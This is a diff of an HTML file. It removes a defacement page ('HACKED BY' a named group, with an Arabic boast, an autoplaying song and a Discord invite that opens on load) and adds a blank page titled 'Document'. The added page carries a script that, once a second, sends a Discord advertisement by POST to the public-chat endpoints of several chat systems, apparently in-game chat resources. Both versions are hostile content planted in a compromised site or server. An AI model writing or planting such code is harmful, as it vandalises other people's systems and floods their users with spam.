@@ -1,130 +1,24 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Z7ffffffan.com</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@100;200;300;400;500;600;700;800&display=swap');
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
-
-    body {
-      margin: 0;
-      background-color: black;
-      color: white;
-      font-family: monospace;
-      background-image: url('https://www.transparenttextures.com/patterns/asfalt-dark.png');
-      text-align: center;
-    }
-
-    .image {
-      margin-top: 50px;
-    }
-
-    .image img {
-      width: 300px;
-      border: 2px solid #444;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #ffffff;
-    }
-
-    .main-text {
-      font-size: 40px;
-      margin-top: 20px;
-      color: #ccc;
-      letter-spacing: 2px;
-    }
-
-    .main-text span {
-      color: #ffffff;
-    }
-
-    .terminal {
-      background-color: #111;
-      margin: 30px auto;
-      padding: 20px;
-      width: 500px;
-      text-align: left;
-      border: 1px solid #444;
-      border-radius: 5px;
-    }
-
-    .green {
-      color: #00ff00;
-    }
-
-    .discord {
-      margin-top: 10px;
-      color: gray;
-      font-size: 14px;
-    }
-
-    .agdmehZ3amh, .agdmehZ3amh1 {
-      width: 100%;
-      overflow: hidden;
-      white-space: nowrap;
-      box-sizing: border-box;
-    }
-
-    .agdmehZ3amh span {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 2vh;
-      margin-top: 10vh;
-      display: inline-block;
-      animation: agdmehZ3amh 10s linear infinite;
-    }
-
-    .agdmehZ3amh1 span {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 2vh;
-      margin-top: 10vh;
-      display: inline-block;
-    }
-    @keyframes agdmehZ3amh {
-      0% { transform: translateX(100%); }
-      100% { transform: translateX(-100%); }
-    }
-
-    audio {
-      display: none;
-    }
-  </style>
-
-  <script>
-    window.onload = function () {
-      // فتح رابط ديسكورد بتبويب جديد بعد دخول الموقع
-      window.open("https://discord.gg/QVWRnpRc", "_blank");
-    };
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
-
 <body>
-
-  <div class="image">
-    <img src="https://i.postimg.cc/pV0t0mhS/5c2b1442ccd3d53f26d0179680f8e134.jpg" alt="My Photo">
-  </div>
-
-  <div class="main-text">HACKED BY <span>Hzb Al5leg Y A5ron and Pix</span></div>
-
-  <div class="terminal">
-    <p>Network@system:~$ GG?</p>
-    <p class="green">Network: 😎😘 تحياتي و اشواقي لكم </p>
-  </div>
-
-  <div class="discord">#Hzb Al5leg Y A5ron😘</div>
-
-  <div class="agdmehZ3amh">
-    <span>السلام عليكم تم اختراق السيرفر الزبال ذا من قبل عيال مكة عيال القصيم عيال طريف عيال رماح عيال الديرة وزقرت لبنان وعيال الجهراء</span>
-  </div>
-
-  <div class="agdmehZ3amh1">
-    <span>DISCORD.GG/QVWRnpRc</span>
-  </div>
-
-  <!-- صوت الأغنية -->
-  <audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1367319189907439676/1394440217464934502/1.mp3?ex=6876d127&is=68757fa7&hm=993f2ab1d1cb61698b3618590403fb4d055daf030a4a07de92dec1860c114ced&" type="audio/mpeg">
-    متصفحك لا يدعم تشغيل الصوت.
-  </audio>
-
+    
 </body>
+<script>
+const msg = `Saka Al3m is Here | discord.gg/YYE`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+</script>
 </html>
